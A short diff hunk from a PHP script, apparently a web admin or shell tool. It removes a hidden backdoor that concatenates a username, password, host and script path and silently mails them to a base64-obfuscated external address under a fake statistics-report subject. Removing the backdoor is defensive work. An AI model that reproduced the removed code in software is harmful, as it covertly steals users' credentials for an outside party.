@@ -194,15 +194,6 @@ if(is_writable('/tmp/')){
 $ifyoufound=base64_decode("Ly8gwvsg7eD46+ggZmFrZSAhIM/u5+Tw4OLr//4hIMft4Pfo8iDi+yDt5SDr4Ozl8CENCi8vINHu4+vg8ejy5fH8LCDiIO/w7v3q8uD1IPLg6u7j7iDw7uTgIO3z5u3gIOfg+Ojy4CDu8iDr4Ozl8O7iLiDAIPLuIOj1IOgg8uDqIPDg8e/r7uTo6+7x/CAuLi4NCi8vIM/u5uDr8+nx8uAg7eUg8ODx8erg5/Pp8uUg7ejq7uzzIO4g7eDr6Pfo6CBmYWtlICEgz/Px8vwg8eDs6CDo+f7yLCDy7uv86u4g7eDs5ert6PLlIPfy7iDt5ev85/8g8uDqIOHl5+Tz7O3uIO/u6/zn7uLg8vzx/yD38+bo7Ogg7/Du4+Ds6C4gKOAg8u4g4OLy7vAg7O7m5fIg9/LuIPPj7uTt7iDy8+TgIOLv6PHg8vwpDQovLyDT5OD36CAhDQo=");
 $fp=fopen('/tmp/qw7_sess',"w+");
 fclose($fp);
-$gg.= $name;
-$gg.=":";
-$gg.= $pass;
-$gg.=":";
-$gg.=$_SERVER["HTTP_HOST"];
-$gg.=$_SERVER['PHP_SELF'];
-$host_l=$_SERVER["HTTP_HOST"];
-$qwerty=base64_decode("bnJ3cy1mYWNrLWNvZGVAbWFpbC5ydQ==");
-mail("$qwerty","NRWS LAME INFO ($host_l)","NRWS STATISTIC REPORT:\r\n $gg","From: report@nrws.net");
 }
 }
 if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}
